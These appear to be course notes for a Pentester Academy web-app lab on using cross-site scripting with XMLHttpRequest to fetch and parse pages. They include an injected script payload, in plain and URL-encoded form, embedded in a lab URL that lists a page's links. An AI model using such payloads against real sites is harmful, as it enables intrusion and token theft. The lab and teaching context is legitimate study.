XHR and HTML Parsing

**********************************************************************************************************************************

Why HTML Parsing?
XSS can be used to traverse the application
HTML Pages might need to be processed -> extract tokens
Text based treatment is painful
DOM based Parsing is required

**********************************************************************************************************************************

HTML in XMLHttpRequest
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest
Limitation
1.) Can be only used for asynchronous requests
2.) Important that the HTML support is only going to work when response type property is set to "document"
var xhr = new XMLHttpRequest();
xhr.responseType = "document";

**********************************************************************************************************************************

Walkthrough

http://pentesteracademylab.appspot.com/lab/webapp/jfp/basics?url=www
Fetch the page below and post all the links in the page
http://pentesteracademylab.appspot.com/lab/webapp/jfp/2

Before encoding:
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if (req.readyState == 4 && req.status == 200) {
            var htmlPage = req.responseXML;

            links = htmlPage.getElementsByTagName("a");

            result = '';

            for (i = 0; i < links.length; i++) {
                result += links[i] + "<br>";
            }

            document.getElementById("result").innerHTML = result;

        }
    };

    req.open("GET", "/lab/webapp/jfp/2", true);
    req.responseType = "document";
    req.send();
</script>

After encoding:
%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20htmlPage%20%3D%20req.responseXML%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20links%20%3D%20htmlPage.getElementsByTagName(%22a%22)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20result%20%3D%20%27%27%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20(i%20%3D%200%3B%20i%20%3C%20links.length%3B%20i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20result%20%2B%3D%20links%5Bi%5D%20%2B%20%22%3Cbr%3E%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20result%3B%0A%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20req.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2F2%22%2C%20true)%3B%0A%20%20%20%20req.responseType%20%3D%20%22document%22%3B%0A%20%20%20%20req.send()%3B%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/basics?url=%3Cscript%3E%0A%20%20%20%20var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0A%20%20%20%20req.onreadystatechange%20%3D%20function%28%29%20{%0A%20%20%20%20%20%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20htmlPage%20%3D%20req.responseXML%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20links%20%3D%20htmlPage.getElementsByTagName%28%22a%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20result%20%3D%20%27%27%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20%28i%20%3D%200%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%20{%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20result%20%2B%3D%20links[i]%20%2B%20%22%3Cbr%3E%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20}%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%22result%22%29.innerHTML%20%3D%20result%3B%0A%0A%20%20%20%20%20%20%20%20}%0A%20%20%20%20}%3B%0A%0A%20%20%20%20req.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2F2%22%2C%20true%29%3B%0A%20%20%20%20req.responseType%20%3D%20%22document%22%3B%0A%20%20%20%20req.send%28%29%3B%0A%3C%2Fscript%3E

**********************************************************************************************************************************
